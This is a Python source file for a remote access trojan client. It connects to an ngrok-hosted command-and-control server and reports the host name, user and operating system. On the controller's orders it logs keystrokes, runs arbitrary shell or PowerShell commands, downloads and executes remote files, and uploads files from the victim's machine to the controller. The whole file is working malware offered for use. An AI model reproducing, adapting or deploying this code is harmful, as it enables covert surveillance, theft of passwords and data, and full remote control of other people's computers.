"""
design@asij

"""

import getpass
import os
import socket
import platform
import time
import threading
import subprocess
import base64
import pynput
import urllib.request
from pynput import keyboard

# If the free version of ngrok is used, the port will change each time ngrok is activated
address = "0.tcp.jp.ngrok.io" # address
port = 18642 # port 
glbSock = None # Stores the sock 

keyBuffer = "" # String to store keystrokes for keylogging
loggerIsRunning = False # Stores whether the keylogger is working (will be used to stop the keylogger)


# Handles the connection of the client to the C2 server through the socket library and tcp server. 
# Preconditions: Valid address and socket, ngrok tcp port is open
# Postconditions: Machine is connected to the C2 server, handler thread is wokring, the machine sends its information via send_beacon
def connect_client():
  global glbSock
  # Infinite loop to keep trying to connect to the server
  while True:
    try:
      # Creates a socket object as clientSocket
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSocket:
        # Connect to server
        clientSocket.connect((address, port))
        send_beacon(clientSocket) # Send beacon to server to indicate that client is alive
        clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))
        glbSock = clientSocket
        handler = threading.Thread(target = command_handler, args=(glbSock,), daemon = True)
        handler.start()
        handler.join()
    except Exception as e:
      print(f'[*] Connection failed: {e}. Trying in 10 seconds...')
      # Delay for 10 sec
      time.sleep(10)

# Sends the current information of the machine to the listener/user. 
# Precondtions: Valid socket
# Postconditions: output is encoded into bytes and sent through the socket
def send_beacon(sock):
  beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
  sock.send(beacon.encode("utf-8"))

###
### Keylogger functions
###

# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
# Handles AttributeError by writing "SP: "
# This function is called to store the keystrokes in a string, then sends it back to the user every 100
# characters. After sending, the keyBuffer is cleared for the next 100 characters.
# Preconditions: Valid key input, pynput library correctly imported
# Postconditions: Keystrokes are stored in a string and sent back to the user every 100 characters, 
# keyBuffer is cleared after sending.
def on_press(key):
    global keyBuffer, glbSock, loggerIsRunning
    
    # Stops the logger and resets for next time
    if not loggerIsRunning:
      keyBuffer = ""
      return
    
    try:
      keyBuffer += key.char
    except AttributeError:
      keyBuffer += f" [SP: {key}] "

    if len(keyBuffer) >= 100 and glbSock is not None: # Send keystrokes every 100 characters
      try:
        glbSock.send(f"KEYLOG|{keyBuffer}".encode("utf-8"))
        # Clear keyBuffer after sending
        keyBuffer = ""
      except:
        keyBuffer = ""

# Activates the keylogger while storing the sock as global sock and updating the logger status. 
# Preconditions: Valid socket, pynput library correctly imported
# Postconditions: Keylogger is activated and keystrokes are sent back to the user
def start_keylogger(sock):
  #updates sock again before using on_press && loggerIsRunning is set to True
  global glbSock, loggerIsRunning
  glbSock= sock
  loggerIsRunning = True
  print("[*] Keylogger started")
  #Starts on_press
  with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
###
### Shell command function
###

# Executes the command based off of the command that is decoded and sends it back through the specified socket by looking through whether
# the command is a cd command, which goes through a different process due to possible child process change. Other terminal commands will 
# go through the same process (differentiating between mac and windows). After, the output is then encoded into bytes from string, then into 
# base 64 for reliability.
# Preconditions: The command input requires a decoded command (non empty string) and sock, socket is valid
# Postconditions: The command is executed and the output is sent back to the user 
def execute_command(command, sock):
    try:
    
      # Special handling for "cd" command
      if command.startswith("cd "):
        try:
          os.chdir(command[3:].strip())
          result = f"[{os.getcwd()}]"
        except Exception as e:
          result = f"Error changing directory: {e}"
      
      # Normal shell commands (whoami, hostname, ipconfig, dir, etc.)
      else:
        if os.name == "nt":
          result_obj = subprocess.run(["powershell", "-Command", command], 
                                        capture_output=True, timeout=15, text=True)
        else:
          result_obj = subprocess.run(command, shell=True, capture_output=True, timeout=15, text=True)
        
        result = result_obj.stdout + result_obj.stderr
        if not result.strip():
          result = "(No output)"

      # Send output back to listener
      encoded = base64.b64encode(result.encode("utf-8")).decode("utf-8")
      sock.send(f"CMD_RES|{encoded}".encode("utf-8"))
      print(f"[+] Executed: {command}")

    except subprocess.TimeoutExpired:
      sock.send(b"CMD_ERR|Command timed out")
    except Exception as e:
      sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))

###
### File download and upload functions
###

# Downloads a file from the specified URL and executes it on the target machine. 
# Preconditions: Valid URL and socket is inputted from command_handler, and the URL is accessible and points to a valid file
# Postconditions: The file is downloaded and executed on the target machine, output or equivalent is sent back
def download_execute(full_cmd, sock):
  try:
    # Split command to check for -e flag
    parts = full_cmd.split()
    url = parts[0]
    execute_after = "-e" in parts   # Check if -e flag is present

    print(f"[*] Downloading file from: {url}")

    # Extract filename from URL
    filename = url.split('/')[-1].split('?')[0] if '/' in url else "downloaded_file.exe"
    file_path = os.path.join(os.getcwd(), filename)

    # Download the file
    urllib.request.urlretrieve(url, file_path)
    print(f"[+] Downloaded: {file_path}")

    sock.send(f"FILE_OK|Downloaded: {filename}".encode("utf-8"))

    # Auto-execute only if -e flag was given
    if execute_after:
      try:
        subprocess.Popen(file_path, shell=True)
        print(f"[+] Executed: {file_path}")
        sock.send(f"EXEC_OK|File executed: {filename}".encode("utf-8"))
      except Exception as exec_err:
        print(f"[!] Execution failed: {exec_err}")
        sock.send(f"EXEC_ERR|{str(exec_err)}".encode("utf-8"))
    else:
      print(f"[*] File saved but not executed (use -e to execute)")

  except Exception as e:
    error_msg = f"Download failed: {str(e)}"
    print(f"[!] {error_msg}")
    sock.send(f"FILE_ERR|{error_msg}".encode("utf-8"))

# Uploads a file from the target machine to the client's machine.
# Preconditions: Valid filename and socket is inputted from command_handler, and the file exists on the target machine
# Postconditions: The file is uploaded to the client's machine, output or equivalent is sent back to the user
def upload_file(filename, sock):
  try:
    full_path = os.path.join(os.getcwd(), filename)
    
    if not os.path.exists(full_path):
      sock.send(f"UPLOAD_ERR|File not found: {filename}".encode("utf-8"))
      print(f"[!] File not found: {full_path}")
      return

    print(f"[*] Uploading: {full_path}")

    with open(full_path, "r") as f:
      file_data = f.read()

    sock.send(f"UPLOAD_DATA|{filename}|{len(file_data)}|{file_data}".encode("utf-8"))
    
    print(f"[+] Uploaded: {filename} ({len(file_data)} bytes)")

  except Exception as e:
    error_msg = f"Upload failed: {str(e)}"
    print(f"[!] {error_msg}")
    sock.send(f"UPLOAD_ERR|{error_msg}".encode("utf-8"))



###
### Command Handler
###

# Handles the command that is received by the user/listener. Using data to collect the input of the user, this function handles the 
# tranasition between the user and the function execute)command) through reformatting of the input. If there is an error, it
# prints it.
# Preconditions: Valid specified socket, libraries correctly imported
# Postconditions: execute_command is functioning or the print statement is printed
def command_handler(sock):
  global loggerIsRunning
  while True:
    try:
      data = sock.recv(4096)

      # When no inut
      if not data: break
      
      cmd = data.decode("utf-8", errors="ignore").strip()
      print(f"[*] Received: {cmd}")
      
      # Keylogging command
      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
      if cmd.startswith("KEYLOG_START"):
        keylog_thread = threading.Thread(target=start_keylogger, args = (sock,),daemon=True)
        keylog_thread.start()
        sock.send(b"KEYLOG| STARTED")
      elif cmd == "KEYLOG_STOP":
        global loggerIsRunning
        loggerIsRunning = False
        sock.send(b"KEYLOG| STOPPED")

      #Downloading and executing a file (-e) from a specified URL command
      elif cmd.startswith("DOWNLOAD:"):
        url = cmd[9:].strip()
        if url:
          download_execute(url, sock)
        else:
          sock.send(b"CMD_ERR| No URL provided for download and execute")

      # Uploading a file from the target machine to the client's machine command
      elif cmd.startswith("UPLOAD:"):
        filename = cmd[7:].strip()
        if filename:
          upload_file(filename, sock)
        else:
          sock.send(b"CMD_ERR| No filename provided for upload")


      # Shell Command
      else:
        execute_command(cmd, sock)

      # Error Handling
    except Exception as e:
      print(f'[*] Error receiving data: {e}')
      break





if __name__ == "__main__":
  connect_client()
